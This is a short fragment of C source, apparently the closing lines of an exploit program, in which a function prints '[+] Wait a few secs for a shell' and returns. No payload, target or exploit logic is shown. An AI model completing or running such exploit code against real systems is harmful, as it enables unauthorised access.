		msg("[+] Wait a few secs for a shell\n");

	return 0;
}
